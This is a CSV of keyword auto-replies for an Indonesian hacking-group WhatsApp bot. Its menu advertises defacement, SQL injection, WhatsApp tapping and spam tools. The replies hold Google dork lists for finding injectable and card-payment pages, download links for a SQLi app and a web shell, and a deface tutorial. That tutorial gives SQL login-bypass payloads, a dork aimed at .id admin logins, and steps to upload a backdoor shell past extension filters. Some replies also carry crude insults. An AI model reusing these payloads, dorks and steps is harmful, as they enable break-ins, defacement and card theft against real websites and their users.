"received_message","pattern_matching","reply_message","multiple_replies","multiple_reply_delay","multiple_reply_delay_max","recipients","contacts","ignored_contacts","reply_delay","reply_delay_max","specific_times","monday","tuesday","wednesday","thursday","friday","saturday","sunday","pause_type","pause_value","disabled"
"p","none","P p P p P situ islam kan ?","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"menu","similar","<========================>\n   GRAYHAT TERSAKITI TEAM  \n      <><><><>BOT<><><><><>\n<========================>\n|> tentang bot\n|> subs rey\n|> arti sql\n|> arti bypass admin\n|> apa itu termux\n|> sql balitbang\n|> sql base64\n|> bypass admin\n|> dork bypass admin\n|> dork cc\n|> dork sql\n|> apk sandroproxy\n|> apk droidsqli\n|> apk bot\n|> apk spam wa\n|> minishell\n|> devace sql\n|> into out file\n|> devace wpbf\n|> devace regmem\n|> devace rce\n|> github grup\n|> dorking shell\n|> wa gb\n|> drupal hidden\n|> sadap wa\n<=======================>\n           ×   peringatan ×\n|>kata""harus sama di atas ajg !\n|>Tanda ini |> jangan lu ketik !\n<=======================>","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"arti sql","none","Apa itu SQL Injection?\n\nSql injection adalah sebuah teknik hacking yang dilakukan dengan menyisipkan baris kode SQL pada kotak isian (misalnya form login) atau pada url yang mana serangan ini akan mempengaruhi logika dari website tersebut.\n\nSql injection memanfaatkan celah keamanan yang disebabkan karena masukan pengguna tidak disaring secara benar oleh aplikasi.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork sql","none","Dork SQL Fresh : \n\nhome.php?cat= item_book.php?CAT= www/index.php?page= schule/termine.php?view= goods_detail.php?data= storemanager/contents/item.php?page_code= view_items.php?id= customer/board.htm?mode= help/com_view.html?code= n_replyboard.php?typeboard= eng_board/view.php?T****= prev_results.php?prodID= bbs/view.php?no= gnu/?doc= zb/view.php?uid= global/product/product.php?gubun= m_view.php?ps_db= productlist.php?tid= product-list.php?id= onlinesales/product.php?product_id= garden_equipment/Fruit-Cage/product.php?pr= product.php?shopprodid= product_info.php?products_id= productlist.php?tid= showsub.php?id= productlist.php?fid= products.php?cat= products.php?cat= product-list.php?id= product.php?sku= store/product.php?productid= products.php?cat= productList.php?cat= product_detail.php?product_id= product.php?pid= view_items.php?id= more_details.php?id= county-facts/diary/vcsgen.php?id= idlechat/message.php?id= podcast/item.php?pid= products.php?act= details.php?prodId= socsci/events/full_details.php?id= ourblog.php?categoryid= mall/more.php?ProdID= archive/get.php?message_id=","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork cc","none","Dork CC fresh\n\n\ninurl:”.php?cid=” intext:”shop”\nview_details.php?id=\ninurl:”.php?cid=” intext:”payment_option”\ninurl:”.php?cid=” intext:”delivery_address”\nProducts.php?id=\ndescription.php?id=\nproductlist.asp?catalogid=\ninurl:”.php?cid=” intext:”My_cart”\ninurl:”.php?cid=” intext:”Payment_Gateway”\ninurl:”.php?cid=” in poptext:”Transaction_succesfull”\ninurl:”.php?cid=” intext:”shoping”\ninurl:”.php?cid=” intext:”otp”\ninurl:”.php?cid=” intext:”verified”\nYour_account_details.php?id=","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"kontol","none","Apa kontol gak senang ?","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"rey","none","Ya ada apa","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk droidsqli","none","https://www.mediafire.com/download/q7g49olglczofm4\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk bot","none","Hubungi Rey bila ingin mendapatkan apk bot\nWa.me/+62089513286355","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"minishell","none","https://www.mediafire.com/download/u9v8lvyhpnaqagy\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bypass admin","none","Tutorial Deface Bypass Admin Login \n\nHallo, Apa kabar?\n\n\nBypass Admin Login~ Sebenarnya ini tidak jauh berbeda dan masih berhubungan dengan SQL Injection. Jika kita ketahui, bug ini memungkinkan seorang attacker untuk masuk sebagai admin hanya dengan memasukan username dan password contoh seperti or 1=1 tanpa harus repot-repot seperti halnya melakukan ekploitasi website.\n\n\n\n\nPengertianya cukup itu saja. Oiya buat yang masih belum mengerti atau pengen tahu yang lebih jelas, kenapa ini bisa terjadi? Lalu dimana letak kesalahan tersebut? Oke, saya sudah menyiapkan artikel sebagai referensi untuk bisa kamu baca mengenai hal ini, berikut linknya:\n\n\nBaca: Sekilas tentang SQLi Pada Form Login\n\n\nPayload Bypass Admin\n\nDari sekian banyak query yang bertebaran di internet, disini saya akan membagikan beberapa query yang sering saya gunakan untuk bypass admin login website, diantaranya sebagai berikut:\n\n\nadmin' #\nadmin' or '1'='1\nadmin' or '1'='1'#\nadmin' or 1=1 or ''='\n'or 1=1 limit 1 -- -+\n' or '1'='1\n' or 'x'='x\n' or 0=0 --\n' or 0=0 #\n' or 1=1--\n' or 'one'='one\n'or 1=1-- -\n/*12345'or 1=1 limit 1 -- -+*/\n'or''='\n\n\nHanya segitu? Iya cuma itu saja, payload bypass admin login tersebut saya gunakan dari awal saya mengenal/melakukan deface (2015) sampai sekarang (tapi sudah jarang sekali). Nah, jika kamu punya payload yang lain mungkin bisa di share pada kolom komentar biar teman-teman yang lain juga pada tahu.\n\n\nBaiklah tanpa berlama-lama, sekarang mari kita ke inti pokok pembahasan selanjutnya, lestgooo.\n\n\nTutorial Bypass Admin Login Website\n\nNah, apa saja yang diperlukan? Berikut diantaranya:\n\n\n1. Dork\n2. Shell Backdoor\n3. Script Deface\n\n\nPenjelasan:\n\nDork~ Jika tidak punya target kamu bisa mencari website yang terkait vulnerability bypass admin login dengan dork, contoh dork misalnya.\n\n\n""inurl:/admin/login.php""\n""inurl:/admin/login.php"" site:.id\n\n\nSelebihnya kamu kembangkan lagi ya biar bisa dapat yang fresh.\n\n\nShell Backdoor~ File backdoor ini berguna untuk edit, upload dan lain sebagainya.\n\n\nScript Deface~ Jika belum punya kamu bisa download script deface lewat pencarian Google atau kalo bisa ya lebih baik bikin sendiri saja.\n\n\nBaiklah dari apa yang sudah saya sebutkan (3 bahan) tadi, jika kamu sudah punya. Sekarang mari kita simak beberapa tutorial dibawah ini.\n\n\nPOC (Prof End Concept) Bypass Admin Login\n\nStep 1: Eksekusi Target\n\n\nHasil dari mencari target dengan dork, kurang lebih seperti ini target yang saya dapatkan.\n\n\nhttp://target.com/admin/index.php\n\n\nNah sekarang, tinggal mengeksekusi website tersebut bisa atau tidaknya saya dapat masuk ke dashboard panel admin dengan menggunakan payload yang tadi saya sebutkan diatas dan saya mencoba menggunakan payload yang admin' or 1=1 or ''='\n\n\nDisaat berada di dashboard panel admin login, kamu isikan username: admin' or 1=1 or ''=' password: admin' or 1=1 or ''='\n\n\n\n\nKemudian tinggal klik pada tombol Login website tersebut. Apabila berhasil kamu akan diarahkan menuju ke menu dashboard panel admin website tersebut, dan itu artinya kamu sudah bisa mengakses seluruh isi website.\n\n\n\n\nCatatan: Perlu di ingat, tidak semua form login admin website bisa di injeksi dengan cara seperti ini, jika gagal kemungkinan sudah di patch bugnya, kamu bisa coba payload yang lain atau cari target yang lainya saja.\n\n\nStep 2: Upload Shell\n\n\nJika kamu sudah berhasil masuk ke dashboard panel admin website target kamu itu artinya sekarang kamu sudah bisa upload shell, edit artikel dan lain sebagainya.\n\n\nLalu bagaimana caranya upload shell backdoor?\n\n\nTips: Jika kita tidak bisa upload shell backdoor dikarenakan form upload tersebut hanya memperbolehkan upload file berformat "".jpg, .gif, .jpeg"" kita bisa mengakalinya dengan bypass extensi shell tersebut. Contoh misalnya seperti ini ""shell.php.jpg, shell.jpg.php, shell.jpg.PhP"" dan lain sebagainya.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
